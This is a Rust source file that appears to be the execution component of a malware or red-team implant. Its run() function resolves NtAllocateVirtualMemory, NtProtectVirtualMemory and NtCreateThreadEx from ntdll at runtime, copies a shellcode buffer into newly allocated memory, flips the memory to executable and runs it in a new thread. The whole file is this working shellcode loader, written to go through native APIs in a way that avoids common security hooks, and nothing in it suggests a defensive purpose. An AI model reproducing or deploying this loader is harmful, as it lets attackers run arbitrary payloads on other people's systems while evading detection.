use std::ffi::c_void;
use std::ptr;
use crate::ntapi::*;

pub fn run(sc: &[u8]) -> bool {
    unsafe {
        let alloc: NtAllocateVirtualMemoryFn = std::mem::transmute(resolve(b"ntdll.dll\0", b"NtAllocateVirtualMemory\0"));
        let protect: NtProtectVirtualMemoryFn = std::mem::transmute(resolve(b"ntdll.dll\0", b"NtProtectVirtualMemory\0"));
        let thread: NtCreateThreadExFn = std::mem::transmute(resolve(b"ntdll.dll\0", b"NtCreateThreadEx\0"));
        let wait: NtWaitForSingleObjectFn = std::mem::transmute(resolve(b"ntdll.dll\0", b"NtWaitForSingleObject\0"));

        let mut base: *mut c_void = ptr::null_mut();
        let mut sz = sc.len();

        let status = alloc(CURRENT_PROCESS, &mut base, 0, &mut sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if !nt_success(status) {
            return false;
        }

        ptr::copy_nonoverlapping(sc.as_ptr(), base as *mut u8, sc.len());

        let mut old_prot: u32 = 0;
        sz = sc.len();
        protect(CURRENT_PROCESS, &mut base, &mut sz, PAGE_EXECUTE_READ, &mut old_prot);

        let mut h_thread: Handle = 0;
        let status = thread(&mut h_thread, THREAD_ALL_ACCESS, ptr::null(), CURRENT_PROCESS, base, ptr::null(), 0, 0, 0, 0, ptr::null());
        if !nt_success(status) {
            return false;
        }

        wait(h_thread, 0, ptr::null());
        CloseHandle(h_thread);
        true
    }
}
